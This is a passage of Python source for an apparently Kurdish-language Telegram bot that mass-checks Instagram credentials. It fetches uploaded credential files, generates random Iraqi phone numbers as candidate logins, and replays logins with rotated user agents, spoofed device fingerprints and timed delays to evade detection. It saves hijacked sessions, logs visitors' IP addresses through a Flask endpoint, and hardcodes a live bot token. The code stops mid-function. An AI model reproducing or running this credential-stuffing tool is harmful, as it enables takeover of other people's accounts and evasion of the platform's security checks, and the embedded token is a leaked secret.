import requests
import time
import random
import os
import json
import threading
from colorama import Fore, Style, init
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
import random
import sys
import io
from flask import Flask, request, redirect
import threading
import uuid
import re
import pickle
import os
import uuid
import socket
from functools import partial


# ئامادەکرنا colorama
init()

# جهێگیرکرنا تۆکێنا بۆتی تەلیگرام
TELEGRAM_BOT_TOKEN = "8139834022:AAG-fWdQd1h47DsLK7XeU0dV4xYeNGMBY8A"
TELEGRAM_CHANNEL = "techbesnor"  # ناڤێ کەنالێ بێی @

# شێوە‌یێن
CONFIG = {
    'VALID_ACCOUNTS_FILE': 'valid_accounts.txt',
    'DELAY_BETWEEN_ATTEMPTS': (3, 7),  # Increased from (2, 5)
    'USER_AGENTS': [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPad; CPU OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36',
    ],
    # لیستا ID یێن ئەدمین کو دکارن بۆرن ژ چێکرنا ئەندامێ
    'ADMIN_IDS': [867526112],  # ID یێ خۆ بدانە لفێرێ، بنمۆنە ['123456789', '987654321']
    'BYPASS_BY_DEFAULT': False,  # دەستپێکرنا ڤێ هەلبژاردنێ
    'USERS_FILE': 'bot_users.txt',  # File to store user IDs
}

# If on PythonAnywhere, adjust some settings
RUNNING_ON_PYTHONANYWHERE = 'PYTHONANYWHERE_DOMAIN' in os.environ
if RUNNING_ON_PYTHONANYWHERE:
    print(Fore.YELLOW + "Running on PythonAnywhere - using optimized settings" + Style.RESET_ALL)
    # Increase wait times further on PythonAnywhere
    CONFIG['DELAY_BETWEEN_ATTEMPTS'] = (5, 10)

app = Flask(__name__)
ip_data = {}  # Store user_id to IP mapping
user_states = {}  # To track which users need to provide IP before proceeding
user_ips = {}     # To store user IPs
socket.setdefaulttimeout(30)

# Detect if running on PythonAnywhere


# Functions for session management
def save_session(username, session):
    """Save session for future use"""
    try:
        sessions_dir = "saved_sessions"
        if not os.path.exists(sessions_dir):
            os.makedirs(sessions_dir)
        
        with open(f"{sessions_dir}/{username}.session", "wb") as f:
            pickle.dump(session, f)
        return True
    except Exception as e:
        print(Fore.RED + f"هەلە د پاراستنا سێشنێ دە: {str(e)}" + Style.RESET_ALL)
        return False

def load_session(username):
    """Try to load saved session for this username"""
    try:
        sessions_dir = "saved_sessions"
        session_file = f"{sessions_dir}/{username}.session"
        
        if os.path.exists(session_file):
            with open(session_file, "rb") as f:
                session = pickle.load(f)
                return session
        return None
    except Exception as e:
        print(Fore.RED + f"هەلە د خواندنا سێشنێ دە: {str(e)}" + Style.RESET_ALL)
        return None
def is_valid_ip(ip_string):
    ip_pattern = re.compile(r'^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$')
    if not ip_pattern.match(ip_string):
        return False
    parts = ip_string.split('.')
    for part in parts:
        if int(part) > 255:
            return False
    return True

# Modify the function to load existing IPs on startup
def load_user_ips():
    if os.path.exists("user_ips.txt"):
        with open("user_ips.txt", 'r', encoding='utf-8') as f:
            for line in f:
                parts = line.strip().split(':')
                if len(parts) >= 2:
                    user_ips[parts[0]] = parts[1]

# Call this function in your main() function
# Add this line to your main() function:
# load_user_ips()
# Route to capture IP
@app.route('/ip/<user_id>')
def capture_ip(user_id):
    ip_address = request.remote_addr
    headers = request.headers
    user_agent = headers.get('User-Agent')
    
    # Store the IP and user agent
    ip_data[user_id] = {
        'ip': ip_address,
        'user_agent': user_agent,
        'timestamp': time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    }
    
    # Log the capture
    print(Fore.GREEN + f"IP captured for user {user_id}: {ip_address}" + Style.RESET_ALL)
    
    # Redirect back to Telegram
    return redirect(f"https://t.me/{TELEGRAM_BOT_TOKEN.split(':')[0]}")

# Function to start the web server
def start_web_server():
    app.run(host='0.0.0.0', port=8000)
def get_user_info(telegram_id=None):
    """Get information about bot users"""
    total_users = 0
    users_today = 0
    users_yesterday = 0
    today = time.strftime("%Y-%m-%d")
    yesterday = time.strftime("%Y-%m-%d", time.localtime(time.time() - 86400))  # 24 hours ago
    
    user_data = {}
    
    if os.path.exists(CONFIG['USERS_FILE']):
        with open(CONFIG['USERS_FILE'], 'r') as f:
            for line in f:
                if ':' in line:  # Format: user_id:date
                    parts = line.strip().split(':', 1)
                    user_id = parts[0]
                    join_date = parts[1] if len(parts) > 1 else "unknown"
                    
                    # Count users
                    total_users += 1
                    if join_date == today:
                        users_today += 1
                    elif join_date == yesterday:
                        users_yesterday += 1
                        
                    # If specific user requested
                    if telegram_id and str(telegram_id) == user_id:
                        user_data = {
                            'user_id': user_id,
                            'join_date': join_date
                        }
                else:
                    # Old format without date
                    total_users += 1
    
    return {
        'total_users': total_users,
        'users_today': users_today,
        'users_yesterday': users_yesterday,
        'user_data': user_data
    }

# Modify record_user function to include timestamp
def get_all_users():
    """Get a list of all user IDs from the users file"""
    users = []
    if os.path.exists(CONFIG['USERS_FILE']):
        with open(CONFIG['USERS_FILE'], 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line:
                    if ':' in line:
                        # New format with date
                        user_id = line.split(':', 1)[0]
                    else:
                        # Old format without date
                        user_id = line
                    
                    users.append(user_id)
    return users
def record_user(user_id, user_data=None):
    """Record user ID to the users file if not already present"""
    user_id = str(user_id)
    user_exists = False
    existing_users = []
    today = time.strftime("%Y-%m-%d")
    
    # Read existing users
    if os.path.exists(CONFIG['USERS_FILE']):
        with open(CONFIG['USERS_FILE'], 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line:
                    if ':' in line:
                        # New format with date
                        parts = line.split(':', 1)
                        existing_user_id = parts[0]
                    else:
                        # Old format without date
                        existing_user_id = line
                        # We'll convert it to new format
                        line = f"{existing_user_id}:{today}"
                    
                    if existing_user_id == user_id:
                        user_exists = True
                    
                    existing_users.append(line)
    
    # Add new user if not already in file
    if not user_exists:
        new_user_entry = f"{user_id}:{today}"
        existing_users.append(new_user_entry)
        print(Fore.GREEN + f"New user recorded: {user_id}" + Style.RESET_ALL)
        
        # Write back all users
        with open(CONFIG['USERS_FILE'], 'w', encoding='utf-8') as f:
            for user in existing_users:
                f.write(f"{user}\n")
        
        # Notify admins about new user
        try:
            # Format notification message
            username = "Unknown"
            first_name = "Unknown"
            last_name = ""
            
            if user_data:
                username = user_data.get('username', 'Unknown')
                first_name = user_data.get('first_name', 'Unknown')
                last_name = user_data.get('last_name', '') or ''
            
            new_user_msg = (
                f"🆕 <b>بەکارهێنەرێ نوی</b>\n\n"
                f"🆔 <b>ئایدی:</b> <code>{user_id}</code>\n"
                f"👤 <b>ناڤ:</b> {first_name} {last_name}\n"
                f"🔗 <b>ناڤێ کارهێنەری:</b> {('@'+username) if username != 'Unknown' else 'نینە'}\n"
                f"📆 <b>رۆژ:</b> {today}\n"
            )
            
            # Send to all admins
            for admin_id in CONFIG['ADMIN_IDS']:
                send_telegram_message(admin_id, new_user_msg)
                
        except Exception as e:
            print(Fore.RED + f"هەلە د هنارتنا ئاگەهداریا بەکارهێنەرا نوی دە: {str(e)}" + Style.RESET_ALL)
def broadcast_message(admin_id, message_text):
    """Send a message to all recorded users"""
    users = get_all_users()
    
    if not users:
        send_telegram_message(admin_id, "❌ <b>هیچ بەکارهێنەرێک نینە بۆ پەیام هنارتن</b>")
        return
    
    # Send initial status message
    status_msg_id = send_telegram_message(
        admin_id,
        f"⏳ <b>دەستپێکرنا هنارتنا پەیامێ بۆ {len(users)} بەکارهێنەرا...</b>\n\n"
        f"0% تەمام (0/{len(users)})"
    )
    
    success_count = 0
    fail_count = 0
    
    # Send to each user and track progress
    for i, user_id in enumerate(users):
        try:
            send_telegram_message(user_id, message_text)
            success_count += 1
        except Exception:
            fail_count += 1
        
        # Update status every 5 users or at the end
        if (i + 1) % 5 == 0 or i == len(users) - 1:
            progress = int(((i + 1) / len(users)) * 100)
            update_telegram_message(
                admin_id,
                status_msg_id,
                f"⏳ <b>هنارتنا پەیامێ بۆ بەکارهێنەرا...</b>\n\n"
                f"{progress}% تەمام ({i+1}/{len(users)})\n"
                f"✅ سەرکەفتی: {success_count}\n"
                f"❌ سەرنەکەفتی: {fail_count}"
            )
            time.sleep(0.5)  # Small delay to prevent API rate limits
    
    # Final status update
    update_telegram_message(
        admin_id,
        status_msg_id,
        f"✅ <b>هنارتنا پەیامێ تەمام بوو</b>\n\n"
        f"• هەمی بەکارهێنەر: {len(users)}\n"
        f"• سەرکەفتی: {success_count}\n"
        f"• سەرنەکەفتی: {fail_count}"
    )
def show_banner():
    """نیشاندانا بانەرەکێ ساناهی یێ گونجای بۆ شاشێن مۆبایلا"""
    print(Fore.CYAN + "=" * 40 + Style.RESET_ALL)
    print(Fore.YELLOW + "       چێکەرا ئەکاونتێن ئینستاگرام یا وەلید" + Style.RESET_ALL)
    print(Fore.CYAN + "=" * 40 + Style.RESET_ALL)

def get_random_user_agent():
    return random.choice(CONFIG['USER_AGENTS'])

def check_telegram_membership(user_id):
    try:
        # ئەگەر کارهێنەر د ناڤ لیستا ئەدمینان دابیت، راستەوخۆ چێککرن دبۆریت
        if str(user_id) in CONFIG['ADMIN_IDS']:
            print(Fore.GREEN + f"کارهێنەر {user_id} د ناڤ لیستا ئەدمیناندایە، چێککرنا ئەندامەتیێ تێت بۆراندن." + Style.RESET_ALL)
            return True

        response = requests.get(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getChatMember",
            params={
                "chat_id": f"@{TELEGRAM_CHANNEL}",
                "user_id": user_id
            }
        )

        if response.status_code == 200:
            result = response.json()
            # بۆ دیتنا بەرسڤا راستەقینە
            print(Fore.CYAN + f"دیباگ - بەرسڤا چێککرنا ئەندامەتیا تەلیگرام: {json.dumps(result, indent=2)}" + Style.RESET_ALL)

            if result.get("ok"):
                # چێککرنا هەمی جۆرێن ستاتوسێ کو دشێن ئەندامەتیێ نیشابدەن
                status = result.get("result", {}).get("status")
                valid_statuses = ["member", "administrator", "creator"]

                if status in valid_statuses:
                    print(Fore.GREEN + f"ستاتوسێ ئەندامەتیێ: {status}" + Style.RESET_ALL)
                    return True
                else:
                    print(Fore.RED + f"نە ئەندامە. ستاتوس: {status}" + Style.RESET_ALL)
            else:
                error_description = result.get("description", "هەلەیەکا نەزانی")
                print(Fore.RED + f"هەلەیا API یا تەلیگرام: {error_description}" + Style.RESET_ALL)
        else:
            print(Fore.RED + f"هەلەیا HTTP یا API یا تەلیگرام: {response.status_code}" + Style.RESET_ALL)

        print(Fore.RED + "چێککرنا ئەندامەتیێ سەرنەکەفت یان ستاتوسەکێ نەدروست ڤەگەراند" + Style.RESET_ALL)
        # ڤەگەراندنا True بۆ بۆراندنا چێککرنێ ئەگەر هەلە د API دە هەبیت (ئارەزومەندی - لابدە ئەگەر تە چێککرنێن مەحکەم بڤێن)
        # return True
        return False
    except Exception as e:
        print(Fore.RED + f"هەلە د چێککرنا ئەندامەتیا تەلیگرامێ دە: {str(e)}" + Style.RESET_ALL)
        # ڤەگەراندنا True بۆ بۆراندنا چێککرنێ ئەگەر هەلە هەبیت (ئارەزومەندی - لابدە ئەگەر تە چێککرنێن مەحکەم بڤێن)
        # return True
        return False

def send_telegram_message(chat_id, message):
    """هنارتنا پەیامێ بۆ تەلیگرام"""
    try:
        response = requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
            data={
                "chat_id": chat_id,
                "text": message,
                "parse_mode": "HTML"
            }
        )
        return response.json().get('result', {}).get('message_id')
    except Exception as e:
        print(Fore.RED + f"هەلە د هنارتنا پەیاما تەلیگرامێ دە: {str(e)}" + Style.RESET_ALL)
        return None

def update_telegram_message(chat_id, message_id, message):
    """نویکرنا پەیاما تەلیگرامێ یا هەیی"""
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText",
            data={
                "chat_id": chat_id,
                "message_id": message_id,
                "text": message,
                "parse_mode": "HTML"
            }
        )
    except Exception as e:
        print(Fore.RED + f"هەلە د نویکرنا پەیاما تەلیگرامێ دە: {str(e)}" + Style.RESET_ALL)

def download_telegram_file(file_id):
    """داونلۆدکرنا فایلەکێ ژ تەلیگرامێ"""
    try:
        # بەرێ هەر تشتەکێ، رێکا فایلێ بدەستبئینە
        response = requests.get(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getFile",
            params={"file_id": file_id}
        )

        if response.status_code != 200:
            return None

        file_path = response.json().get('result', {}).get('file_path')
        if not file_path:
            return None

        # پاشی فایلێ داونلۆد بکە
        file_url = f"https://api.telegram.org/file/bot{TELEGRAM_BOT_TOKEN}/{file_path}"
        file_response = requests.get(file_url)

        if file_response.status_code != 200:
            return None

        # پاراستن دناڤ فایلەکا کاتی دە
        temp_file = "temp_credentials.txt"
        with open(temp_file, 'wb') as f:
            f.write(file_response.content)

        return temp_file
    except Exception as e:
        print(Fore.RED + f"هەلە د داونلۆدکرنا فایلێ دە: {str(e)}" + Style.RESET_ALL)
        return None

def get_follower_count(session, username):
    """بدەستڤەئینانا ژمارا فۆلۆوەران بۆ ناڤێ کارهێنەریەکێ"""
    try:
        # Add a random delay before the follower count request
        time.sleep(random.uniform(0.8, 2.0))
        
        headers = {
            'User-Agent': get_random_user_agent(),
            'X-IG-App-ID': '936619743392459',
            'Accept-Language': 'en-US,en;q=0.9',
            'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not:A-Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'x-requested-with': 'XMLHttpRequest'
        }
        
        response = session.get(
            f"https://www.instagram.com/api/v1/users/web_profile_info/?username={username}",
            headers=headers
        )

        if response.status_code == 200:
            data = response.json()
            follower_count = data.get("data", {}).get("user", {}).get("edge_followed_by", {}).get("count", 0)
            return follower_count
        return "نەزانکری"
    except Exception as e:
        print(Fore.YELLOW + f"[DEBUG] Error getting follower count for {username}: {str(e)}" + Style.RESET_ALL)
        return "نەزانکری"
def generate_and_send_numbers(chat_id, count=400):
    """چێکرن و هنارتنا ژمارێن عێراقی بۆ کارهێنەری"""
    try:
        # هنارتنا پەیاما سەرەتایی
        message_id = send_telegram_message(
            chat_id,
            f"⏳ <b>چێکرنا {count} ژمارێن عێراقی...</b>\n\nتکایە چاڤەرێ بکە، دێ دەمەکێ بیت."
        )

        # چێکرنا ژمارەیان
        numbers = generate_unique_numbers(count)

        # پاراستن د ناڤ فایلەکێ دە دگەل وەختێ بۆ رێگرتن ژ سەرنڤیسینێ
        timestamp = time.strftime("%Y%m%d_%H%M%S", time.localtime())
        filename = f"iraqi_numbers_{timestamp}.txt"

        with open(filename, "w", encoding='utf-8') as file:
            for num in numbers:
                file.write(num + "\n")

        # هنارتنا فایلێ
        try:
            with open(filename, 'rb') as f:
                files = {'document': f}
                requests.post(
                    f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument",
                    data={"chat_id": chat_id, "caption": f"✅ {count} ژمارێن تەلەفۆنا عێراقی هاتنە چێکرن"},
                    files=files
                )

            # نویکرنا پەیاما ستاتوسێ
            update_telegram_message(
                chat_id,
                message_id,
                f"✅ <b>بسەرکەفتی {count} ژمارێن عێراقی هاتنە چێکرن!</b>\n\nفایل بۆ تە هاتیە هنارتن."
            )

        except Exception as e:
            # ئەگەر هنارتنا فایلێ سەرنەکەفت، وەکی دەق بهێنە هنارتن ل پارچەکەران
            update_telegram_message(
                chat_id,
                message_id,
                f"⚠️ <b>{count} ژمارە هاتنە چێکرن بەلێ نەشیاین وەک فایل بهێنە هنارتن.</b>\n\nهنارتن وەک پەیامێن دەقی بدەستپێکر..."
            )

            # هنارتن د پارچەکێن 50 ژمارەیی دە بۆ رێگرتن ژ سنۆرێن درێژیا پەیامێ
            chunk_size = 50
            for i in range(0, len(numbers), chunk_size):
                chunk = numbers[i:i+chunk_size]
                chunk_text = "\n".join(chunk)
                send_telegram_message(
                    chat_id,
                    f"<b>ژمارێن عێراقی (پشک {i//chunk_size + 1}/{(len(numbers)+chunk_size-1)//chunk_size}):</b>\n\n<code>{chunk_text}</code>"
                )

    except Exception as e:
        send_telegram_message(
            chat_id,
            f"❌ <b>هەلە د چێکرنا ژمارەیان دە:</b> {str(e)}"
        )
def generate_unique_numbers(count=400):
    used_numbers = set()  # بۆ رێگرتن ژ دوبارەبوونێ
    numbers_list = []

    while len(numbers_list) < count:
        # چێکرنا 7 رەقەمێن هەرەمەکی
        random_digits = ''.join([str(random.randint(0, 9)) for _ in range(7)])
        full_num = f"+964770{random_digits}"
        local_num = f"0770{random_digits}"

        # دلنیابوون ژ نەبوونا دوبارەبوونێ
        if full_num not in used_numbers:
            used_numbers.add(full_num)
            numbers_list.append(f"{full_num}:{local_num}")

    return numbers_list
def check_account(username, password):
    """پشتراستکرنا لۆگینێ دگەل ئینستاگرامێ دکاردئینیت requests لجیاتی curl_cffi"""
    debug_mode = True  # Set to False to disable detailed logging
    
    # Create a debug log file with a unique name for this login attempt
    debug_file = f"instagram_debug_{username}_{int(time.time())}.log"
    
    # Helper function for debug logging
    def log_debug(message):
        if debug_mode:
            print(Fore.CYAN + f"[DEBUG] {message}" + Style.RESET_ALL)
            # Also write to file for later inspection
            try:
                with open(debug_file, 'a', encoding='utf-8') as f:
                    f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {message}\n")
            except:
                pass  # Silently fail if we can't write to the debug file
    
    log_debug(f"Starting login verification for {username}")
    
    try:
        # Try to load existing session first
        existing_session = load_session(username)
        if existing_session:
            log_debug(f"Loaded existing session for {username}")
            # Test if session is still valid
            try:
                log_debug("Testing existing session validity")
                profile_test = existing_session.get(
                    f"https://www.instagram.com/api/v1/users/web_profile_info/?username={username}",
                    headers={
                        'User-Agent': get_random_user_agent(),
                        'X-IG-App-ID': '936619743392459',
                        'Accept-Language': 'en-US,en;q=0.9'
                    },
                    timeout=30  # Add explicit timeout
                )
                
                if profile_test.status_code == 200:
                    log_debug(f"Session for {username} is still valid!")
                    return {'status': 'valid', 'message': 'ئەکاونتا دروست (سێشنا هەیی)', 'session': existing_session}
                else:
                    log_debug(f"Existing session returned status code: {profile_test.status_code}")
            except Exception as e:
                log_debug(f"Error testing existing session: {str(e)}")
                # Continue with new login attempt
        
        # درستکرنا سێشنێ
        session = requests.Session()
        
        # Set a default timeout for all requests
        session.request = partial(session.request, timeout=30)
        
        # Generate unique identifiers for this session
        device_id = uuid.uuid4().hex
        android_id = f"android-{uuid.uuid4().hex[:16]}"
        family_device_id = uuid.uuid4().hex
        waterfall_id = uuid.uuid4().hex
        mid = uuid.uuid4().hex[:16]
        
        # Select a random user agent and keep it consistent for this session
        chosen_user_agent = get_random_user_agent()
        log_debug(f"Using User-Agent: {chosen_user_agent}")
        
        # Set platform-specific JavaScript details
        if "Windows" in chosen_user_agent:
            platform_js = "Windows"
            browser_version = "125.0.0.0"
        elif "Macintosh" in chosen_user_agent:
            platform_js = "MacIntel"
            browser_version = "117.0.0"
        else:
            platform_js = "Linux x86_64"
            browser_version = "124.0.0"
            
        # Add special handling for PythonAnywhere
        if RUNNING_ON_PYTHONANYWHERE:
            log_debug("Applying PythonAnywhere-specific optimizations")
            # Add more delays for PythonAnywhere
            time.sleep(random.uniform(2, 4))
            
        log_debug("Preparing browser fingerprint")
        
        # Create more advanced headers mimicking real browsers
        base_headers = {
            'User-Agent': chosen_user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',  # Do Not Track
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
            'sec-ch-ua': f'"Google Chrome";v="{browser_version}", "Chromium";v="{browser_version}", "Not:A-Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': f'"{platform_js}"'
        }

        # STEP 1: First visit to Instagram homepage to get initial cookies
        log_debug("Visiting Instagram homepage to get initial cookies")
        home_response = session.get(
            'https://www.instagram.com/',
            headers=base_headers,
            allow_redirects=True
        )
        
        if home_response.status_code != 200:
            log_debug(f"Initial homepage visit failed with status: {home_response.status_code}")
            log_debug(f"Response body preview: {home_response.text[:200]}...")
            return {'status': 'error', 'message': 'هەلە د ڤەکرنا مالپەرێ دە', 'session': None}
        
        # Parse cookies received
        log_debug(f"Initial cookies received: {dict(session.cookies)}")
        
        # Extended delay after initial visit
        delay = random.uniform(3, 5)
        log_debug(f"Waiting {delay:.2f} seconds before next request")
        time.sleep(delay)
        
        # STEP 2: Visit the login page specifically
        log_debug("Visiting login page")
        login_page_headers = base_headers.copy()
        login_page_headers['Referer'] = 'https://www.instagram.com/'
        
        login_page_response = session.get(
            'https://www.instagram.com/accounts/login/',
            headers=login_page_headers,
            allow_redirects=True
        )
        
        if login_page_response.status_code != 200:
            log_debug(f"Login page visit failed with status: {login_page_response.status_code}")
            return {'status': 'error', 'message': 'هەلە د ڤەکرنا پەیجا لۆگینێ دە', 'session': None}
        
        # Get CSRF token from cookies
        csrf_token = session.cookies.get('csrftoken', '')
        log_debug(f"CSRF token: {csrf_token}")
        
        # Another delay to mimic human behavior
        delay = random.uniform(2, 4)
        log_debug(f"Waiting {delay:.2f} seconds before getting login page data")
        time.sleep(delay)
        
        # STEP 3: Get login page data to gather X-IG-WWW-Claim and other tokens
        log_debug("Getting login page metadata")
        try:
            claim_headers = base_headers.copy()
            claim_headers.update({
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': 'https://www.instagram.com/accounts/login/',
                'X-IG-App-ID': '936619743392459',
                'X-ASBD-ID': '129477'
            })
            
            claim_resp = session.get(
                'https://www.instagram.com/api/v1/web/login_page/',
                headers=claim_headers
            )
            
            if claim_resp.status_code != 200:
                log_debug(f"Login page data request failed with status: {claim_resp.status_code}")
                log_debug(f"Response body preview: {claim_resp.text[:200]}...")
            
            try:
                claim_data = claim_resp.json()
                www_claim = claim_data.get('config', {}).get('www_claim', '0')
                log_debug(f"X-IG-WWW-Claim value: {www_claim}")
            except:
                log_debug("Failed to parse login page data JSON response")
                www_claim = '0'
            
        except Exception as e:
            log_debug(f"Error getting login page data: {str(e)}")
            www_claim = '0'
        
        # Need to ensure we have a CSRF token
        if not csrf_token:
            log_debug("No CSRF token found, using fallback method")
            # Fallback method to get CSRF token
            csrf_token = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for _ in range(32))
        
        # STEP 4: Perform the login
        log_debug("Preparing to perform login")
        # Add a delay before login
        delay = random.uniform(3, 5)
        log_debug(f"Waiting {delay:.2f} seconds before login attempt")
        time.sleep(delay)
        
        # Create more realistic timestamps
        time_now = int(time.time())
        
        # Encrypt the password
        enc_password = f'#PWD_INSTAGRAM_BROWSER:0:{time_now}:{password}'
        
        # Set up login headers
        login_headers = {
            'User-Agent': chosen_user_agent,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': '*/*',
            'X-Requested-With': 'XMLHttpRequest',
            'X-CSRFToken': csrf_token,
            'X-IG-WWW-Claim': www_claim,
            'X-Instagram-AJAX': str(random.randint(1000000000, 9999999999)),
            'Origin': 'https://www.instagram.com',
            'Referer': 'https://www.instagram.com/accounts/login/',
            'sec-ch-ua': f'"Google Chrome";v="{browser_version}", "Chromium";v="{browser_version}", "Not:A-Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': f'"{platform_js}"',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Accept-Language': 'en-US,en;q=0.9',
            'X-IG-App-ID': '936619743392459',
            'X-ASBD-ID': '129477'
        }

        # Prepare login data with all fingerprinting details
        login_data = {
            'username': username,
            'enc_password': enc_password,
            'queryParams': '{}',
            'optIntoOneTap': 'false',
            'trustedDeviceRecords': '{}',
            'device_id': device_id,
            'android_id': android_id,
            'waterfall_id': waterfall_id,
            'family_device_id': family_device_id,
            'client_type': 'web'
        }
        
        log_debug(f"Sending login request for {username}")
        try:
            response = session.post(
                'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
                data=login_data,
                headers=login_headers,
                allow_redirects=True
            )
            
            log_debug(f"Login response status code: {response.status_code}")
            log_debug(f"Response cookies: {dict(session.cookies)}")
            
            # Short delay after login
            time.sleep(random.uniform(2, 3))
            
            # Initialize result
            result = {}
            
            # Try to parse the JSON response
            try:
                result = response.json()
                
                # Debug log the result (truncated)
                debug_response = str(result)
                truncated_response = debug_response[:500] + "..." if len(debug_response) > 500 else debug_response
                log_debug(f"Raw login response: {truncated_response}")
                
            except Exception as json_error:
                log_debug(f"Failed to parse JSON: {str(json_error)}")
                log_debug(f"Raw response: {response.text[:200]}...")
                return {'status': 'error', 'message': 'بەرسڤا نەدروست ژ ئینستاگرامێ', 'session': None}
            
            # IMPROVED RESPONSE HANDLING
            
            # CASE 1: Explicitly successful login
            if result.get('status') == 'ok' and result.get('authenticated') is True:
                log_debug("Login explicitly successful based on response")
                
                # Verify the session is valid
                if session.cookies.get('sessionid'):
                    log_debug(f"Login successful for {username} - sessionid cookie present")
                    
                    # Save the successful session
                    save_status = save_session(username, session)
                    log_debug(f"Session save status: {save_status}")
                    
                    # Additional verification: try to access profile data
                    try:
                        log_debug("Verifying session with profile data request")
                        verify_headers = base_headers.copy()
                        verify_headers['X-IG-App-ID'] = '936619743392459'
                        
                        profile_response = session.get(
                            f"https://www.instagram.com/api/v1/users/web_profile_info/?username={username}",
                            headers=verify_headers
                        )
                        
                        if profile_response.status_code == 200:
                            log_debug("Profile data verification successful")
                        else:
                            log_debug(f"Profile data verification returned status code: {profile_response.status_code}")
                    except Exception as e:
                        log_debug(f"Error during profile verification: {str(e)}")
                    
                    return {'status': 'valid', 'message': 'ئەکاونتا دروست', 'session': session}
                else:
                    log_debug("No sessionid cookie despite 'authenticated':true")
            
            # CASE 2: Explicit incorrect password or user not found
            error_message = result.get('message', '').lower()
            if 'incorrect password' in error_message or 'password you entered is incorrect' in error_message:
                log_debug(f"Incorrect password for {username}")
                return {'status': 'invalid', 'message': 'پاسۆردا نەدروست', 'session': None}
            
            if 'user not found' in error_message:
                log_debug(f"User not found: {username}")
                return {'status': 'invalid', 'message': 'کارهێنەر نەهاتە دیتن', 'session': None}
            
            # CASE 3: 2FA required
            if result.get('two_factor_required') or 'two_factor' in str(result):
                log_debug(f"2FA required for {username}")
                return {'status': 'two_factor', 'message': '2FA پێویستە', 'session': None}
            
            # CASE 4: Checkpoint
            checkpoint_url = result.get('checkpoint_url')
            if checkpoint_url:
                log_debug(f"Checkpoint detected for {username}: {checkpoint_url}")
                
                # Check if we still got a valid session despite the checkpoint
                if session.cookies.get('sessionid'):
                    log_debug(f"Got sessionid despite checkpoint for {username}")
                    
                    # Try to access profile data to confirm session validity
                    try:
                        verify_headers = base_headers.copy()
                        verify_headers['X-IG-App-ID'] = '936619743392459'
                        
                        profile_response = session.get(
                            f"https://www.instagram.com/api/v1/users/web_profile_info/?username={username}",
                            headers=verify_headers
                        )
                        
                        if profile_response.status_code == 200:
                            log_debug("Could access profile data despite checkpoint - marking as valid")
                            
                            # Save the session despite checkpoint
                            save_session(username, session)
                            
                            return {'status': 'valid', 'message': 'ئەکاونتا دروست دگەل چێکپۆینت', 'session': session}
                        else:
                            log_debug(f"Failed to access profile despite sessionid, status: {profile_response.status_code}")
                    except Exception as e:
                        log_debug(f"Error verifying profile with checkpoint: {str(e)}")
                
                return {'status': 'security_code', 'message': 'چێکپۆینت پێویستە', 'session': None}
            
            # CASE 5: Security challenge
            if 'challenge' in str(result) or result.get('challenge'):
                log_debug(f"Challenge detected for {username}")
                
                # Check if we got a valid session despite the challenge
                if session.cookies.get('sessionid'):
                    log_debug(f"Got sessionid despite challenge for {username}")
                    
                    # Try to access profile data
                    try:
                        verify_headers = base_headers.copy()
                        verify_headers['X-IG-App-ID'] = '936619743392459'
                        
